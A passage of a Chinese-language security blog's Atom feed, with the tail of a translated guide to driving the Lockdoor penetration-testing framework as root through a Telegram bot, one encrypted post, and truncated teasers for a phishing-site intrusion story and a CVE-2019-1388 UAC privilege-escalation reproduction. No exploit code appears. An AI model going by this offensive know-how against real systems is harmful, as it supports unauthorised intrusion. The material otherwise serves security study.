在任何一个Telegram对话或者消息中。</p><h1 id="2个选择"><a href="#2个选择" class="headerlink" title="2个选择"></a>2个选择</h1><p>Lockdoor Framework需要root权限，你可以做：</p><ul><li>1&gt; root运行机器人服务器（不推荐）。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$: sudo node server</span><br></pre></td></tr></table></figure></li><li>2&gt;在Telegram对话中用root权限运行。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$: ( Telegram chat ) : &#x2F;run sudo lockdoor</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="NEXT"><a href="#NEXT" class="headerlink" title="NEXT"></a>NEXT</h1><p> 转到你的telegram机器人聊天输入/run   lockdoor (或者  /run sudo lockdoor 如果没有用root启动服务器 )。</p><p><img src="https://i.loli.net/2019/12/16/sFpMxOLbuciy2lR.jpg" alt="5.jpeg"><br><img src="https://i.loli.net/2019/12/16/3dwyiqb7Wok6QKL.jpg" alt="6.jpeg"></p><hr><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p><code>你可以查看Lockdoor Framework Github repo 获取更多有关资料。</code></p><ul><li><a href="https://github.com/SofianeHamlaoui/Lockdoor-Framework?source=post_page-----a309c41dbc40----------------------" target="_blank" rel="noopener">作者Github </a></li><li><a href="https://twitter.com/S0fianeHamlaoui?source=post_page-----a309c41dbc40----------------------" target="_blank" rel="noopener">作者推特</a></li><li><a href="https://sofianehamlaoui.me/?source=post_page-----a309c41dbc40----------------------" target="_blank" rel="noopener">作者网站</a></li><li><a href="https://www.facebook.com/S0fianeHamlaoui?source=post_page-----a309c41dbc40----------------------" target="_blank" rel="noopener">作者脸书</a></li><li><a href="https://samny520.github.io/" target="_blank" rel="noopener">译者博客</a></li><li><a href="https://twitter.com/samny78087805" target="_blank" rel="noopener">译者推特</a></li><li><a href="https://blog.csdn.net/sun1318578251" target="_blank" rel="noopener">译者CSDN</a></li></ul><hr><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>感谢 Arbaz Hussain 为这篇文章提供宝贵的想法。<br>感谢 Alba Mendez ，多亏她的bot-shell，才能成功创作这个Telegram机器人。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;dl&gt;&lt;dt&gt;Author&lt;br&gt;: Sofiane Hamlaoui&lt;/dt&gt;&lt;dd&gt;&lt;a href=&quot;https://medium.com/@SofianeHamlaoui/use-telegram-bot-as-a-penetration-testing-framewor
      
    
    </summary>
    
    
      <category term="译文" scheme="http://yoursite.com/categories/%E8%AF%91%E6%96%87/"/>
    
    
      <category term="翻译" scheme="http://yoursite.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>从翻邮箱发现钓鱼站到钓鱼系统通杀注入</title>
    <link href="http://yoursite.com/2019/12/13/%E4%BB%8E%E7%BF%BB%E9%82%AE%E7%AE%B1%E5%8F%91%E7%8E%B0%E9%92%93%E9%B1%BC%E7%AB%99%E5%88%B0%E9%92%93%E9%B1%BC%E7%B3%BB%E7%BB%9F%E9%80%9A%E6%9D%80%E6%B3%A8%E5%85%A5-1/"/>
    <id>http://yoursite.com/2019/12/13/%E4%BB%8E%E7%BF%BB%E9%82%AE%E7%AE%B1%E5%8F%91%E7%8E%B0%E9%92%93%E9%B1%BC%E7%AB%99%E5%88%B0%E9%92%93%E9%B1%BC%E7%B3%BB%E7%BB%9F%E9%80%9A%E6%9D%80%E6%B3%A8%E5%85%A5-1/</id>
    <published>2019-12-13T04:59:24.000Z</published>
    <updated>2020-05-05T13:16:38.553Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="ddef219584f6646788cde61cc4940a1df0729d0573058c4cd9b225a03114269e">f6944a8f306d04a44e599112d594c44ce45fea38df061c140909ac432189673ae5c07535517bc6c146ebf6d97595f22b73b1e42eba9dc288f828960a966c654140ba51f9d1529775e53c1b0da043dd3b34c7898a1e818340f254230d6aa1030bf76465c0809b843aff84805135b254caf0e2e4af68c6ecd85be86028a28b7d4679efb6d18cb9c9ad68202edea6f476d2de0f98e457724effe8ffcaac53cd0870f80fe5613956d0f861d6d1153874a4be50af779500ddc286f0ce12ccb0a3a3fb810de1a563fcf1d82e47bcfe444d23f36eb7f3ff48a57bc0671c59c67e55913e85481aa93c6e72870e31fd6acb77924ea4ee08ee296779c2b44536ff88e792bd75d475aee99b6d6349405e82294b7d1163f7ad1ea737d5395c10ba6f0156cb21ad6623a73faebca5281d5b475b2e716719be9c50b9854f1f82b52078388e3ff85ac612c97e8cb55129fcca5dc912ef32c28f5fe27b567137a6c2754a098f6ba965464b4f23fc2b5cb8227a65c4ff7a2c61b36f586d78ed540d0484205aa0499534e85a5fb2bbad24a6f6be0518666a70f43dfd187fad1e8001a513656144c21330925be73a3456e8304c56d7092fbe200607063e755994c82733a0aa30e6e1ac295c779a5450e9a36db9cf89ae461f85d62370bb9403d457db63e0bf81ebcdf04bacb636ee40aec17961c1db75d2a069e2043df9d09cb12347c3e7ee78b9e24abb9f774778fed5845b1fbfc9c6f368ec86a6d69ec3fee3718eddf5c0e0144999fdece23f448549771254c09b5ff7ffd598a156019dcfa6c5337636cc5281af3a28cc0c383b24523c58991ab7c608c23ac4966556da259222c4fe2151c4b5582f581c5fd4e47e78d05945a9f3a134f7f336334d56e0b61354bb8c4acd37a22222174123a99fd5081f375ac0e03082316ff03418e9bfb7ce307c46f68a904d6aa353aa2f7fd87b8bc099408b604084d163d1474b26ab6761b89a43f009c113c91c861f254565e250d50a52656764765d2ab67c7c455dad7386f28eaf704dab96bd68def92d791e7c5ffe5b13307499126d74c62cf9b64200bbe881130a977087420c179142e16e8d6591fbfa6fbdbb2e7df4f441bde8c65c1d6978c2fab236f4fe0c4db733123cae99dcb0bf126742be13b0b65ca8939714cbe3fde83036602d31ac7bc483a8e105b8987fd8bc7b9d8c39cd9151a5f4e27f40c1e38232c2b9ef03cd63b9790805107c87177f6aa6d9312ee27569b35a90a2ea99342b83684c14327f4e2fd14c4e8ef10570653c167dbc8c90e356febde30b6ad4682c2d067450f04d2d002569d95483a9181216f366cf84b0457dc4b3c7195f21af0db58a334bd26725cdcd7345f6b89fe904c5c61a4175cd453986a6b5ceff0bf18e7a026d8d9419583328abad49449f60752a86e501bdff8c4ff2e6bcc89071bd3af9450a2812e19a6e7546eb11e1da9271887eb30253482ea5ce018da090c1605260da3c79adc08038c0b26145f6fa4f563e7035bb661dd66a61de20ab223c1a42f47148762f40ad8200af27d77c2bedbbb11b966b261f969b878b382c5bd5b14e41274964ee69c3f0ba289c60bdf3829b02a2fff849b04a0a9aca5f496e0dd0b432044a93bf2acebce1d1d5663be79087146d624441db05f0d6e00cfce39ad1faa1c3147cc297ff466472dd73c2c4e97da81f88a20c3d5a4c9930cbed663a567e02683de99397af21808979aa81785eaba11a05d7356e08e6ddf62fda4a414af0ea2467cd9d19114d96ae88e1d072650eb53298979abfa2d3f6491fb9d045b033d7d8efc3922f553c04933e8ec71432a1148154c12c17012e6473a12f65e028505819a5fc5071b1c49a53efb282f037296d41f38580af4be14612a9232191cee339901b6fcbb1352b73907fea7a7f765f6dbc33fdf31760a4dbe84bc0c9f3da08fcb039b54a791dca5f8af0ea094cd026ab19cf0e6ef96ad9c32710636effeb28268f5c9c1f0ea81a25bedff49f680d51c238e57658f28e79ae7eb93ca0e89276f0aa1a8cd05137f6921583addb3b56c0669f94780dad0968ed1044488ee3de8aa18005fe2eeb753d0787daac351ab077ff2fd9eb6f4055d52cfedae37832bea352b1d478730beef44eeaf8bde95c4d1f18f917917066771dbf40e86e834d7d2eeb4fdddfbb7cf54469907326ac96d9caa50ea3d342ae4c38d77c2d88429103f791f7b78f45fb9620a04619d5dea00b727dc99506ec1bfc2fac4548791cd5798030ac6be4a8ba60d8dec3b26ee1fb5769a0d8dda26868a8b60ce4eed7d44b844312a87216846bbe8a71ec354770a40e706671463db1c29ebf0479eb55d0fb93085f4c188470ce1acf7bb39de0b08d7208b53cfa930efe612fe816216b3bad2a4124fc793b4f35016f1de4b41bcdfdece632ebee03494a84052c24804716fd4819ea37da755ba85a66cebb98ae5ea3f742d881cb8dc4b09fb2d7526cfdea1dc9d8552ac3f37b426c3fae1e8759edaba04a7f868b245d2c4e1309b76c81de46860e9e020f83c567b75e52876ac200040010af319ae7862bedc074c3dc4df57addf9e33dcd8ad9e08a9a0385a45fca9d7b0ea0f8678b6689ebc615ef9e3076c5349e662988ff706ba00ab09c8dc29740a404c70d512bcbeeb4b898ae1dc296dadc89257eb003a170879e1cbfc541eb60af623b1dbb866f8d0b1379b4022eac2ea822926e474cc1f3937f3f6e5c5e7ebaf7dfdef9684cf7ad34e2d6fcf61923aaf4fc3d01b24ac5def43d7dbc9a4f7a1e521e815caef84bc492a60927a54f2269750ed44182cf41ecba7645bc3b6f1cb358fda68f636767a5a00f1a814fc82ff58ef8955137955d779eb4a7c646955eca36dffedc0434a156ca03197cdbce6878ba59737a521bfbd951d934e57a63528167bd90499e25170d93a9dd74199102a40b26fb3d7dd68d1fa4eabe21c3262fee003e638d85c348d25ce13c60aa3fda3327b9a02917d1da8089d2bb70a3097e96617aedb893872cb63766d4d9b529740cbf9c8ed5b226d20a885d81bb221ea08b5b4f520d712e19515165c9111c0eaeb76ce267b021898e75a2d462f10ac55ea3c94ef2ea6284ea23bd03863878eb200fc478f87dd6638e7815bdc860e305ad9b921765afc1034c10d8d66e9ac69b68b7258d9d76f3a3cfbff98b197c97a129f99adbda0fa12da3376e38396d5d1e55cd12c2eaef1fa27b39327619d7bb772ba6bc10674388ed9fa988bbdb397c289b25701369056eecc8ec5d7ce5ec820743c195ac175c0e09a117b1297f2558d6d5b37a15a784b711bd83288cbb7b6fd6133025d63777c80a79fbe1b1355fd9193b7f9f8df4dac88d70772cac438cd8a1b1cd961b529ab182da0c9c8b02800be7429d8cd18da7bf5f28360b3cb15e9fa7ae8ea832cdccda58c7718ccf8b3eafe414b3770eb314865f2463a7c712aeb99be91c043b73f6f733975019eeb41b624f3c03fdd120de40ba7ff685f9de8473da2e1931f7d479fc019bf015742a39633c8998b2ca402e0bff76e2094ec1cf43a3a574b0f74a76ce7b4cdeba505b006e1cf3165dd1d74c9e4465df57bb08cf4cd8cd89abc0961c4fe0b398d6611522f4cd9373076081c062f650e8588353ac070a6a2d8ada77af7b26dbea279fad9a860e55def2f9ce4a7dade94f7d4e51ba34431461a852e08a97e2ec0649cf88d310069f61f0dd7863f66a400bd2100e8b703e834983076c5816e7c76fc7601c5320a0a1aa4e805999e94e21d66c6db84a95cd75386e930e137f92ee1421834823e5694b279bbfcd39b2bcec715f7461a77834ff629ae870bd7cb13155e547401935f2557ac0d75d14e4f31f7ead0606bfa605008c1a7e619f703a7c717f189fd2c768a12e25b2696562baead1fb6ddea12a36b9054d0cb696e28edb4f48673f24325e94d64eb5f3e9036c92aa2bd0470df4fe1e9cfffa2818701ab25238215427c03c44f22b2b2a36409801835356b836fbc597496a99492fbf544e8bee0659e326f518b40ed9ca35e8568296297eef4f9bfbb686c0498feb0855b3b3fbafbc4ef2bd83f7fe8f94fa28fa18c81f5401f85c8905d75b7484c81f0a71cd5ba15d74964107653f12bcc5e72ff30f9f25f976cdac851543ead3175b9e714c9ae8d0901449ed9db29c768eafc230606339d9cab6961a27979d23d81bb959c22988e80818a8431df068eec69a2a226ffc4222ecb9cf36d643523b9e63c8d7869e1b9c525fe83facdbf020643a6e6958d8a417a863320b175f2ce3190fb719e53629e8431f0f035bfe854ec56af2b55f698d139f266543a3568552aaaf6e574d828257340fa913b6374967be909384f712f4843ecc25014bed1d0a5444c4e52862863fcef41ff11d61bdec7f9a86aced738683b2f1b71435fb5952e766ee26dd2e69c214412674ceffad7390157405f494dc9647f0f90ce030601f65c756c4c725d0d6d6d32d3ed619411612b8897b28f1790f4f88e79af0f7c4c0343fc821411f5aecc2c818a997420de1283c05085fe63f009077db301433184334b4d1b447e7965d9b0bd44281f471918282046fee8638436318b67be0d847bcebcd394f6551a87e2656e6c5a812880c327981bdbb2cb71c6c964f0637459a667874d371191305af2ea7fad04f2cfe1c6b97ed9eb657fac72bbb707a675ba78042f60e91ac0819dc096107da72c9424a67e41afaf8d1a0896ce03dfc6c3f1f73ef1a686e6d81432f94bc78cf4f840879dda55a6bcaafeb9f6eda4fb58e2092ff236cf8a3bcd3916cb30b52b0794c209bd277161f3e378f41c8e762dc89eb9db38ca30f4187782ddedb751584e5bfd8eb767cafb42808bc5c95c8d0062ba13cadabad342bdb2303e105f15655a14f66a1ca3132ec1dbb7b36f6eaae60713a321f5946261c5d51a0ebe6c57f599c3c06110c9dc6674148a4212e3527fc2e3a37399d6df3bd94a30d1222e261bb2b1fc073f73271229dbd7cfcdb9a33571f0084a2a82a669656cc0863c81bcd4d43223b1f4a5663eebae4842227a798cda18d64e3db95f7f928b0bb1e7fc70ed94874ad82c0a09b1f371eeb3fe9bf69067e52a51404dc066dd572822b5720744c517e8fd29e592de4af6a6fa37ad8140334ce6f1e63a5e547aeeafa8084c1d285644587d9399f200e0afd6a51bf6e5084eae7e3c2cf7646053a2ddf52fd8b283cfbe20394629977df5735bfc77202b14a2f4693c3333bc7a70ebba7e2d99fb685ec66ebbbda59c468b4f2656feaf2ad7ed5170b03810e5875f25fe4c71e33d6f6c640c41d9a4f111b192730d3a0408b388e0519ac5f8f1511c95a7b7eb7426ec2cee35c6618db8866f3b5a0277bebd34d76a598335db783d5f0d3efe4ca8c5d2541d2ce36be6fc86e096f1dccd17ca68bc5491ec9836772fc970381924c771c358bd31a55c61ad9450154f9fb254abbed386b9165b40ddaaa3c0f21b854d185e50819d98ab0d11f0a3cc36a6c1525d10e08d0c865a67461f105135b64fd8f2ac79e566901258f2842d8c9f3647adf59e3199ac11e2c5ec9bcd36daa59421ee2dd394bc132759be73f41d69ccf904ab1424a34250a4c805225040084e2ae3b53e5a9aad346390901a2b7051fd9e4d3088117d7483f33fa39b797551a9daa913d1a73233f283bc8a42ac95a7b0634e7f7764507d10120a9ec31a3d558b68c78c109b8de33853e8c2d5a8b87b2c0b8ff0f78338f35a2d2b6e4688c9e6c428153379fb453d72da790c5e23f84377c8ca94d9ec31c580eb5e612988161a0c0e07fc9b6f21a5274f15d86bb016d3c495b93df02602b3a5f030ef16887d74c5756f90f62ffc1afd6c417047c88a1f23f287b28bf5f87d1bc9af82d05096cf2afcfa3954adba916bfd052ff6655985b5dbf51ad5a78ef68996fc22c8f7fb7e47d968a1a593e22b8a2db043f25164ab4fdfadf7982bb4740a826a28d8cf14b9d260de3ab984f04d5c2f1bedb35bb3a2ded6c1c28346c266856a4096ca050bdcf734c0a9a9e64ed54ed98bcf4b556b39af087de5da1a6e19fc9a4bc09020d6b065fd972559bd2d7e9975350319e4f62905ecd7be93652c97d342dea73e994ce8646ef5747e526aa60f1fda266c1f595a4bc0931f128097d05d1e9fd926fb75b0cfeaac7709aee699afb75c59e20df5fb4867f1ab3132a6d8bcd28d01730298777a72ade34aa5f928c6560f97ae78e8f325d80f0c093280c6c837f352b8f8687c626d86e24d6880a6148aff727bace009ecdb1b2c7785776d268d75de09fe07e817109481f92bf03389a6de1cf5cc01fd3e0fd39778ef0cce32e4fd2fa918769eb6be9122ca02a30f15552b18fdb00e00163ebccdd2d2b794e1bd397a442c8de9a62aafb70448634bc3017d703afb85b12c7c56911ef326995e5b1858d56e2578848e1fa0365367539229549677974e065c3b632ca6e7fedb8f69f3efdc712926918c78a2783dade7534a16d563da47435c64df9ede01df7e4ec37c713aea269fd0af53b66369a6a250048a08d41ddb876a8f2605e10938bf2226584a68e72a8b8a875cada08d7cdb4cb89c2a24ad3a4fd0a2c7f9bdcb0be0b0805de3a9ce1f0bcc8025b1a9c2d28f5cac068fbe5eb7cd16e5e3be26253fdd3776445944723250ae17b06d97fc21b8fad0dc0049090c1a033f3bef62d9ac70334d4cd1383d486095581be90a4d13c17fb7ae5b65eec61737e499d075f323390af0dc3bab12d29cd6b7496d9e538a150ffeea5a5c02e86a8027d57d4d203d97f6823e65c2da88642eb95dcfd9d19b934c4e94eb389207abe86fb91c9d58f25ca0c0aae96e42b977b59f9da812e388ea18ba066c4d902c1055fd9a2edfc264e3b8e78121dd9ff2cc17f617f13b631d53af383b9aee7a0136bb9da5dbe402763eafcdb0349bbffc7f7bf74295bda727c630d9845de33fc7f9cc14142bd43205481da849ad90aa420d2b9a7fb571871bb8e4463e77dd2fabc3281cca2ec790957bb277df71eda24d041a16f2b752252e4553bbac75f7431702106e4397372f7b9e0588f8b8ec1f182b013564c884ff1b7426f5794cc46913718e74cbeed7a8e77f791e0dc740ef964e92d92a321db967ef9ab0fdd42e657d72c8b9158eb3badd4729d4d6127e984fd85fa8e006d005c7cb43b5d2e80742aef3f7f85aa16c90f2fb9b6f9f90456aecce24c09025c15e0e2556e49000e65eed5c4589b378d5c64f0adfbcb201840cb154627182a76d6b72f5b44dc58c8ed18d3b930010eafb9095023b5094e327a92c6bc10a1fa2b2188c8482effc5b7c2692d3b9fec2388168fad7d5b2b839ab3d0a92e5398558239d8d70fc2e1a889dc7477e2e3e06a34f8ca88bf130961c3226d9c328c1b51a8f6a1967b421c2eda972fa61ffae94d69fc1bef664e0077edbb98731ee565ab8ce02e69ed244a4480c4ddfcdc47dcdb79141097f15313fbcca12c782f826d4ad20bd6ee6520be97f33d408528c6ede758f5a6674779083b98472e44b5ecf4e05abfb19243032c81f30ec6e88f9b5ecbc6dcab4e025b471cf69bf6387548cdc104f1ea1c740677d37415e1f87d84b421bfb4f6a8bf99052cbaf116b3254bbc7a8e8eefe43b54f366920d9863f19d46c1bb78c4771712265cbd638a450085cd84b112cab8a360a6e23784fc98760492f7b81aeaf7a5677aa620f05db47180f35774d697417bff03faa89260b70836b69285a876155a85b12db7e0cf063fa9b32f64c44f40a605c5421498be35d1b720efdee50c4859342af66d3aed2925691d5da34cfc6bff061170ca0817f671cece383caed6820c9a6495c384989756be2abe631e195c3872f7cd4be1dd88e2ffa5671894e68df75c4cab1281b8cbbb21e5cbda56132485304bc1b62240aca59056818b65ea37581db675b820dc81e5f7e748ec7ac6769dda88b27c4ee7e873e6d6541a82df254eb887bddc664a132e943f1a52b3ba243cf16ec9942117b6c90ff383cc213d59c5dc892f81e685118a0c22c5f66f4d009f8d7a89c962c4708b9949c6ddbe243d111e72bafbc7c3be8750d0ba3971726d9dbe7262e3c1e36ec114e1bd5f239e5febb486a67b546631aab893d0860e830e979e525a76be16f8d9c7c64c85ed3656b2265836301433a009c6acbd03e507398e626a8d8d8997e840c90888e029e4af11d77731eeb85ba9b43c3b31bf14a65d526e382841d19ef8988a402ff7d26013a1683d741c5122cd42c03102b234e76f09ed3849edbf886826fb7d6a86cf59a8f4fab0749fd12521ae95dff61cc7b7d3eed345f0a4a6f7d04e284fa92f70e7b0a6ebcd0b74eec87d01000725220c5c0e94134b6884e7e7d15ec39babbba91594162d80f901a71866083bd78a9627ab5a27bd05e46c5cb4e24675c2398adcbd3718b15654c987edce15d191b2099e73e2b9a48fb6005a7dfccefb4bef031b8e4fcb3cf46a76b345c3f09cce9a5694e74b22d8e8c062cb231251b077ce74b1e347241a725ef09c3937d9024bc721560b5a35a368bc070dfb27c85a46f9327a12600aeee6e51f531c640a46e511ceba48d79cbe5f68ba9db9343f287325ac66d8365fd80c0a05a7a6a7ca21330b4602368400a092b5185d12479eb0c343492b0a75286bd73e6fff661f9375c33bd1191bb115cee256e6bb5ef7e3172c9f8a4c5ec917ff8a8af31880aa329b23f4be2c3bc713bee8a653770a870c1fa626fe69fe77023888a742c6dd41df0dcf1895cf6f418324b3eaafcfca140d7b93c7c4fd00d52a26ec6af71934fb846b6f6460a50ba74e9eb62f1fcbe52128ce89792759036d355c4115c9cebd24b7fa95863d110fda0bb8c7655599b2445172f8faf4599c77a5c7b98847739bb94b50dcfcce5f29e6257248ecaf07ffb4067dc415cd27b2bc1ee7341a2a2c756504a5f5eff7a28af75f7b827be5584d29dbb0365b4c0ff78c1ba11ab4ac9b8911192a86befa2c8ce02cf94996a27ba03390315b98351241c0254052a5930faac8b85f312ce8ffe1116648f86189787f44b60205cf621bf0d4d65b960e9df7b925d006f861f81c22385061a84c49560143d56cbdf69336e4e42a2b075826bac98d72f3423910a7678f98a227f520ac3d23f7ed54045457cf0c1979124335051d1b61fcd8cd57211be697cc3f6617070d9ec112bb7ee0323d11e71da913f4a353f3c12e072e84276411b7c55e9e310948ec1dc3da2ebf1e5a88876a96b51321d386eb4cfad60648c519264a478de4a01ff6953bf77f797456840af0c8eef94ecbe2481cf881b49e3ebad184de4a5489c6c3cdf0599ea02e9d61b14bfc27d3d3</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="实战" scheme="http://yoursite.com/categories/%E5%AE%9E%E6%88%98/"/>
    
    
      <category term="实战" scheme="http://yoursite.com/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>[原]记一次渗透学习||钓鱼网站渗透</title>
    <link href="http://yoursite.com/2019/12/13/%E5%8E%9F-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/"/>
    <id>http://yoursite.com/2019/12/13/%E5%8E%9F-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/</id>
    <published>2019-12-13T02:43:54.000Z</published>
    <updated>2019-12-14T04:40:36.196Z</updated>
    
    <content type="html"><![CDATA[<p>文章目录前言故事起源故事开始故事高潮意外剧情番外篇测试中小技巧<br>前言<br>故事纯属虚构！请不要相信我瞎白话。</p><p>主要事情：日钓鱼网站<br>主要人物：</p><p>丞相</p><p>丞相大表哥有传言我丞相表哥是个富二代，高富帅，简直是黑阔界的担当。U1S1 丞相表哥是挺帅，有没有钱我就不知道了。</p><p>05</p><p>05是一个传说中的黑阔，相传黑阔界年龄最小的表哥。</p><p>我本人</p><p>相对前两位表哥，我简直就是个弟弟存在。</p><p>…                    <div><br>                        作者：sun1318578251 发表于 2019/12/13 10:43:54 <a href="https://blog.csdn.net/sun1318578251/article/details/103522733" target="_blank" rel="noopener">原文链接</a> <a href="https://blog.csdn.net/sun1318578251/article/details/103522733" target="_blank" rel="noopener">https://blog.csdn.net/sun1318578251/article/details/103522733</a>                    </div><br>                    <div><br>                        阅读：6                     </div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;文章目录前言故事起源故事开始故事高潮意外剧情番外篇测试中小技巧&lt;br&gt;前言&lt;br&gt;故事纯属虚构！请不要相信我瞎白话。&lt;/p&gt;
&lt;p&gt;主要事情：日钓鱼网站&lt;br&gt;主要人物：&lt;/p&gt;
&lt;p&gt;丞相&lt;/p&gt;
&lt;p&gt;丞相大表哥有传言我丞相表哥是个富二代，高富帅，简直是黑阔界的担当。U
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[原]CVE-2019-1388 UAC提权复现</title>
    <link href="http://yoursite.com/2019/11/30/%E5%8E%9F-CVE-2019-1388-UAC%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/11/30/%E5%8E%9F-CVE-2019-1388-UAC%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-11-30T08:49:07.000Z</published>
    <updated>2020-05-05T13:17:34.160Z</updated>
    
    <content type="html"><![CDATA[<p>目录0x00 前言0x01 漏洞影响0x02 漏洞复现0x03 免责声明0x04 参考<br>0x00 前言</p><p>该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示——Secure Desktop。这些提示是由名为consent.exe的可执行文件产生的，该可执行文件以NT AUTHORITY…                    <div><br>                        作者：sun1318578251 发表于 2019/11/30 16:49:07 <a href="https://blog.csdn.net/sun1318578251/article/details/103325724" target="_blank" rel="noopener">原文链接</a> <a href="https://blog.csdn.net/sun1318578251/article/details/103325724" target="_blank" rel="noopener">https://blog.csdn.net/sun1318578251/article/details/103325724</a>                    </div><br>                    <div><br>                        阅读：90                     </div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;目录0x00 前言0x01 漏洞影响0x02 漏洞复现0x03 免责声明0x04 参考&lt;br&gt;0x00 前言&lt;/p&gt;
&lt;p&gt;该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
